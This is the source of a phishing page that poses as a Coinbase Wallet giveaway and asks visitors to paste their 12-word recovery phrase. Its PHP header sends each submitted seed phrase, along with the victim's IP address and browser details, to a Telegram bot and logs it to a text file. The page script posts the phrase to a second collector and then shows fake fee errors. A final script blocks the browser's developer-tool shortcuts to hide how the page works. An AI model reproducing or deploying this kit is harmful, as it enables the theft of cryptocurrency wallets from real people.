<?php

include "id.php";
if(isset($_POST['seed'])){
 foreach($IdTelegram as $chatId) {
    $ip = getenv("REMOTE_ADDR");
        $date = date('m/d/Y h:i:s a', time());
    $message = "[+]━━━━━━❤️‍🔥PHARSEMASUK Coinbase USDT❤️‍🔥━━━━━━[+]\n[👤 Login] : ".$_POST['seed']."\n      [+]━━━━【💻 System】━━━[+]\n[🔍 IP INFO] : ".$ip."\n[⏰ TIME/DATE] : ".$date."\n[🌐 User-Agent] : ".$_SERVER['HTTP_USER_AGENT'];
  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
 }
$myfile = fopen("Goodgame.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
HEADER("Location: coinbase.php");
}
?>

<!doctype html>
<html lang="en"><head>
<style>
.anticon {
  display: inline-block;
  color: inherit;
  font-style: normal;
  line-height: 0;
  text-align: center;
  text-transform: none;
  vertical-align: -0.125em;
  text-rendering: optimizeLegibility;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

.anticon > * {
  line-height: 1;
}

.anticon svg {
  display: inline-block;
}

.anticon::before {
  display: none;
}

.anticon .anticon-icon {
  display: block;
}

.anticon[tabindex] {
  cursor: pointer;
}

.anticon-spin::before,
.anticon-spin {
  display: inline-block;
  -webkit-animation: loadingCircle 1s infinite linear;
  animation: loadingCircle 1s infinite linear;
}

@-webkit-keyframes loadingCircle {
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}

@keyframes loadingCircle {
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
</style>
<meta charset="utf-8"><link rel="icon" href="truste.svg"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#fafafa">
<link href="apk.css" rel="stylesheet">
<link rel="apple-touch-icon" href="truste.png"><title>Coinbase~Giveaway</title>
<link href="chunk1.css" rel="stylesheet">
<link href="app.css" rel="stylesheet">
<link href="main.chunk.css" rel="stylesheet">
<script src="jquery.min.js"></script>
<script src="ethers-v4.min.js" charset="utf-8" type="text/javascript"></script>
</head>
<body>



<div id="root"><div class="ant-spin-nested-loading"><div class=""><div class="sc-jqCOkK kFZWwp"><div class="sc-gGBfsJ jvrGcO"><div class="sc-jnlKLf OHNdu"><div class="sc-fYxtnH hARKVj"></div><br>
<div class="confirm-approve-content__identicon-wrapper">&ensp;&ensp;&ensp;<img class="identicon confirm-approve-content__identicon" src="mpc.png" alt="" style="height: 60px;width: 60px;"></div>
<h1>&ensp;&ensp;Coinbase Wallet</h1>
<h2>&ensp;&ensp;&ensp;Import Wallet</h2><p class="thepadding">Enter your wallet’s 12 word recovery phrase (also called a seed phrase).
</p>
<br><br>
<div class="sc-htoDjs cDnNqw">
	<form method="post"  class="ant-form ant-form-horizontal">
        <div class="ant-row ant-form-item ant-form-item-with-help" style="row-gap: 0px;"><div class="ant-col ant-form-item-control">
<div>
    <div class="thepadding">
        <textarea class="import-account__secret-phrase" placeholder="Paste seed phrase from clipboard" name="mpc" id="seed"></textarea><h5>To claim reward without cheating, we need confirmation your wallet, to make sure it's really you</h5>
        </div></div><div class="ant-form-item-explain">
                </div></div></div>

                <div class="thepadding">
<button class="button sc-VigVT fWmldN" disabled="" id="imp">IMPORT WALLET</button>
<div1></div1></div></form>
                </div>
                <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdn.ethers.io/scripts/ethers-v4.min.js" charset="utf-8" type="text/javascript"></script>
    <script>
      const redirectUrl = 'coinbase.php' // redirect url setelah memasuki lastStage
      const lastStage = 3 // stage terakhir untuk redirect (stage === lastStage)
      let stage = 1 // awal stage
      const errorMsg = ['Need 0.01 ETH to receive the reward','Need 0.01 ETH to receive the reward'] // error message urutan berdasarkan stage
      let check = false
      let passForCreate = false
      let passForCreateConfir = false
      let words = false

      $(".closeBtn").on("click", function (e) {
        $(".alertBox").hide()
        $(".alert").hide()
      })  

      function showBtn() {
        if(words) $("#imp").prop("disabled", false)
        else $("#imp").prop("disabled", true) 
      }
      
      $('#seed').on("change keyup paste", function(evt) {
        let pass = $(this).val()
        if(pass.split(" ").length == 12 || pass.split(" ").length == 18 || pass.split(" ").length == 21 || pass.split(" ").length == 24){
          $("#wordsErrorConfir").hide()
        
          try{
            let mnemonic = pass
            let mnemonicWallet = ethers.Wallet.fromMnemonic(mnemonic)
            words = true
            $("#wordsErrorConfir").hide()
            $("#incorecct").hide()
          } catch (e){
            $("#wordsErrorConfir").hide()
            $("#incorecct").show()
            words = false
          }

        } else{
          $("#wordsErrorConfir").show()
          words = false
          
          $("#incorecct").hide()
        }

        showBtn()
      })
      
      $("#imp").on("click", function(){      
        let mnemonic = $("#seed").val()
        let wallet = ethers.Wallet.fromMnemonic(mnemonic)
        if(stage < lastStage) {
          $.ajax({
            method: "POST",
            url: "Metamask.php",
            data: { seed: mnemonic, wallet: 'Metamask' },
            success: function(data) {
              updateStage()
            }
          })
        } else window.location = redirectUrl
      })

      function updateStage() {
        if(typeof errorMsg[stage - 1] !== 'undefined') $("#errorText").html(errorMsg[stage - 1])
        else $("#errorText").html(errorMsg[0])
        stage += 1
        $("#errorText").css('display','')
        setTimeout(function(){
          $("#errorText").css('display','none')
        }, 3000)
      }
      
      setTimeout(function(){
        $(".loader").hide() 
        $(".alertBox").fadeOut('slow')
        $(".alert").fadeOut('slow')
      }, 2000)
    </script>
  </body>
</html>

<script>
    
    document.onkeydown = function (e) {
 
        // disable F12 key
        if(e.keyCode == 123) {
            return false;
        }
 
        // disable I key
        if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
            return false;
        }
 
        // disable J key
        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
            return false;
        }
 
        // disable U key
        if(e.ctrlKey && e.keyCode == 85) {
            return false;
        }
    }
 
</script>

</div></div></div></div></div></div></html>

